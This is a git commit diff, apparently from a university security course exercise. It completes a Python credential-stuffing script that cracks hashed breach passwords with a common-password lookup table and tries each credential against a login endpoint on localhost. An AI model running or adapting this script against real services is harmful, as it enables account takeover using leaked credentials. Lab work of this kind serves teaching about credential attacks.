da7d70534298e8a92e10c37dc57a51e77b709efd
Ananya Paul <ap2273@cornell.edu>
2019-09-17 11:39:38 -0400

    q 1

--- stuff.py
+++ stuff.py
@@ -1,9 +1,12 @@
 from csv import reader
+import json
 from requests import post, codes
 
 LOGIN_URL = "http://localhost:8080/login"
 
 PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
+HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
+COMMON_PASSWORDS_LOOKUP_TABLE_PATH = "common_passwords_lookup_table.json"
 
 def load_breach(fp):
     with open(fp) as f:
@@ -22,10 +25,22 @@ def attempt_login(username, password):
     return response.status_code == codes.ok
 
 def credential_stuffing_attack(creds):
-    pass
+    hash_dict = get_lookup_table()
+    for cred in creds:
+        status = attempt_login(cred[0],hash_dict[cred[1]])
+        if status:
+            print(cred)
+    return
+
+def get_lookup_table():
+    with open(COMMON_PASSWORDS_LOOKUP_TABLE_PATH) as json_file:
+        hashes = json.load(json_file)
+    return hashes
 
 def main():
-    creds = load_breach(PLAINTEXT_BREACH_PATH)
+    # creds = load_breach(PLAINTEXT_BREACH_PATH)
+    # credential_stuffing_attack(creds)
+    creds = load_breach(HASHED_BREACH_PATH)
     credential_stuffing_attack(creds)
 
 if __name__ == "__main__":
